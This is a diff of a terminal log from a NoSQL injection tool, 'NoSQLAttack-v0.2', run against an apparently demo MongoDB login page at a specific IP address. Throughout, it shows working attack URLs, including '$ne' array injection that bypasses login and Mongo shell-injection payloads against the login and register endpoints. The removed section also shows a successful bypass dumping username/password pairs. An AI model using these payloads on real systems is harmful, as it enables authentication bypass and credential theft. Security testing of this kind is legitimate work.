@@ -194,25 +194,6 @@ Options
 9-Toggle Verbose Mode: (Current: OFF)
 x-Back to main menu
 Set an option:1
-Enter host or IP/DNS name:dsf
-
-Target set to:dsf
-
-
-
-
-Options
-1-Set target host/IP (Current: dsf)
-2-Set web app port (Current: 80)
-3-Set App Path (Current: Not Set)
-4-Toggle HTTPS (Current: OFF)
-5-Set Not Set Port (Current : 27017)
-6-Set HTTP Request Method (GET/POST) (Current: GET)
-7-Set my local Not Set/Shell IP (Current: 127.0.0.1)
-8-Set shell listener port (Current: Not Set)
-9-Toggle Verbose Mode: (Current: OFF)
-x-Back to main menu
-Set an option:1
 Enter host or IP/DNS name:219.223.243.159
 
 Target set to:219.223.243.159
@@ -251,19 +232,21 @@ Options
 9-Toggle Verbose Mode: (Current: OFF)
 x-Back to main menu
 Set an option:x
-        _   _       _____  _____ _                      
-       | \ | |     /  ___||  _  | |                     
-       |  \| | ___ \ `--. | | | | |                   
-       | . ` |/ _ \ `--. \| | | | |                    
-       | |\  | (_) /\__/ /\ \/' / |____          
-       \_| \_/\___/\____/  \_/\_\_____/                  
-                                        _          
-    /\      _      _                   | |  _        
-   /  \   _| |_  _| |_   _____    ___  | | / /       
-  / /\ \ |_   _||_   _| / __  \  / __| | |/ /        
- / /--\ \  | |    | |_  | |_| |  ||__  | |\ \       
-/ / -- \ \ \___\  \___\ \______\ \___| | | \_\      
-===============================================    
+===============================================
+TERM environment variable not set.
+        _   _       _____  _____ _
+       | \ | |     /  ___||  _  | |
+       |  \| | ___ \ `--. | | | | |
+       | . ` |/ _ \ `--. \| | | | |
+       | |\  | (_) /\__/ /\ \/' / |____
+       \_| \_/\___/\____/  \_/\_\_____/
+                                        _
+    /\      _      _                   | |  _
+   /  \   _| |_  _| |_   _____    ___  | | / /
+  / /\ \ |_   _||_   _| / __  \  / __| | |/ /
+ / /--\ \  | |    | |_  | |_| |  ||__  | |\ \
+/ / -- \ \ \___\  \___\ \______\ \___| | | \_\
+===============================================
 NoSQLAttack-v0.2
 sunxiuyang04@gmail.com
 
@@ -284,21 +267,21 @@ Using 4 for injection testing.
 List of parameters:
 1-username
 2-password
-Inject all parameters?(Y/N)Y
+Inject for username and password?(Y/N)Y
+Attack queries are listed:
+Testing Mongo PHP array injection for login...
 http://219.223.243.159:80/NoSQLInjectionAttackDemo/login/login.php?username[$ne]=1&password[$ne]=1
-Testing Mongo PHP array injection for all parameters...
-Injecting http://219.223.243.159:80/NoSQLInjectionAttackDemo/login/login.php?
-URI :http://219.223.243.159:80/NoSQLInjectionAttackDemo/login/login.php?username[$ne]=1&password[$ne]=1
-Sending random parameter value...
-Got response length of 994.
-Random value variance: 604
 
-req:{"username":{"$ne":"1"},"password":{"$ne":"1"}}Good bye, Joe!<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
-<html><head><meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1"><title>success</title></head><body>
-<h1 align="center">login succeed</h1>
-</body></html>
-username:123</br>password:123</br>username:098</br>password:098</br>username:qwer</br>password:qwer</br>username:321</br>password:321</br>username:1234</br>password:1234</br>username:1234</br>password:1234</br>username:yang1</br>password:yang1</br>username:yang2</br>password:yang2</br>username:yang3</br>password:yang3</br>username:yang3</br>password:yang3</br>username:yang4</br>password:1234</br>username:yang5</br>password:1234</br>username:123</br>password:123</br>username:yang</br>password:yang</br>username:1234</br>password:12344</br>username:xiaolizi</br>password:xiaolizi</br>username:xiaolizi</br>password:xiaolizi</br>0.050002813339233seconds
+Testing Mongo shell injection for login...
+http://219.223.243.159:80/NoSQLInjectionAttackDemo/login/login.php?username=23',$or:[{},{'a':'a &password='}],$comment:'successful MongoDB
+
+Testing Mongo shell injection for register...
+http://219.223.243.159:80/NoSQLInjectionAttackDemo/login/login.php?username=23&password=23','injection':'injection
+
+Start injection:
 Successful injection!
+Possible injection.
+Possible injection.
 
 
 Vulnerable URLs:
@@ -306,9 +289,7 @@ http://219.223.243.159:80/NoSQLInjectionAttackDemo/login/login.php?username[$ne]
 
 
 Possibly vulnerable URLs:
-
-
-
-Timing based attacks:
+http://219.223.243.159:80/NoSQLInjectionAttackDemo/login/login.php?username=23',$or:[{},{'a':'a &password='}],$comment:'successful MongoDB
+http://219.223.243.159:80/NoSQLInjectionAttackDemo/login/login.php?username=23&password=23','injection':'injection
 
 ```
